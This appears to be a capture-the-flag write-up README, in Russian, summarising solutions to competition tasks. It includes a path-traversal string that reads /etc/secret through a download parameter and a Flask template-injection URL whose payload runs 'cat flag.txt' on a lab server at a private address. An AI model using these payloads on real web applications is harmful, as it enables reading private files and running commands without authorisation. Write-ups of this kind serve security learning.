# nto_4fun_2024
REV-1. В таске был encrypt ввода, после чего его версия сравнивалась с заданной
 ![Screenshot_2024-03-21_14_07_43](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/f9103d65-ba78-4d0e-915e-e0956b53be2c)
Для решения таска необходимо было забрутить его значения.
- **Код приложен в файле с названием REV-1**

## Web-1
1. burp
2. target
3. download запрос на file1.txt
4. hint1: указание что флаг в /etc/secret
5. LFI /download?file_type=../../etc/secret
6. Profit!
![web1 1](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/68bb735e-ca77-4362-b6ce-46de99d7310d)
![web1 2](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/b980683b-8f5e-42af-bad5-7112e81a6bf6)


## web2
magic(?)

## web3
403 error bypass(дополнительный / перед flag)
template injection flask
http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%22cat%20flag.txt%22).read()}}
![web3](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/14cc0e39-3750-47b6-b74d-4bb765d1c289)

